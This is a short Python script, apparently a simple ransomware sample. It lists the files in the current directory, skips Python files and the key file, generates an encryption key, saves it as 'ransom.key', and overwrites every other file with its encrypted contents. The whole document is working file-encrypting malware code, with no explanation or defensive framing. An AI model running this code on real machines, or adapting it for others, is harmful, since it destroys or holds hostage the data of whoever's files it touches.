import os
from cryptography.fernet import Fernet 

files = []

for file in os.listdir():
    if file.endswith(".py") or file == "ransom.key":
        continue

    if os.path.isdir(file):
        continue

    files.append(file)

key = Fernet.generate_key()

with open("ransom.key", "wb") as ransom_file:
    ransom_file.write(key)

for file in files:
    with open(file, "rb") as ransom_file_read:
        contents = ransom_file_read.read()

    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file, "wb") as ransom_file_write:
        ransom_file_write.write(contents_encrypted)
